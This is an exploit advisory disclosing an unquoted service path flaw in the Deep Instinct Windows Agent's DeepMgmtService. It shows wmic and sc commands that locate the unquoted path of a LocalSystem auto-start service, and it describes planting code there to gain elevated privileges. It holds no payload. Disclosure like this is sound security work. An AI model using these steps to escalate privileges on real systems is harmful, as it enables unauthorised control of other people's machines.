# Exploit Title: Deep Instinct Windows Agent 1.2.29.0 - 'DeepMgmtService' Unquoted Service Path
# Discovery by: Oscar Flores
# Discovery Date: 2020-03-05
# Vendor Homepage: https://www.deepinstinct.com/
# Software Links : https://www.deepinstinct.com/2019/05/22/hp-collaborates-with-deep-instinct-to-roll-out-ai-powered-malware-protection-for-next-generation-hp-elitebook-and-zbook-pcs/
# https://press.ext.hp.com/us/en/press-releases/2019/hp-elevates-premium-and-personalized-pc-experiences-for-leaders-and-creators.html
# Tested Version: 1.2.29.0
# Vulnerability Type: Unquoted Service Path
# Tested on OS: Windows 10 Pro 64 bits

# Step to discover Unquoted Service Path:

C:\>wmic service get displayname,pathname,name | findstr /i "deepmgmtservice"
Deep Instinct Management Service	DeepMgmtService		C:\Program Files\HP Sure Sense\DeepMgmtService.exe

# Service info:

C:\>sc qc DeepMgmtService
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: DeepMgmtService
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\HP Sure Sense\DeepMgmtService.exe
        LOAD_ORDER_GROUP   : FSFilter Anti-Virus
        TAG                : 0
        DISPLAY_NAME       : Deep Instinct Management Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\>

#Exploit:
# A successful attempt would require the local user to be able to insert their code in the
# system root path undetected by the OS or other security applications where it could
# potentially be executed during application startup or reboot. If successful, the local
# user's code would execute with the elevated privileges of the application.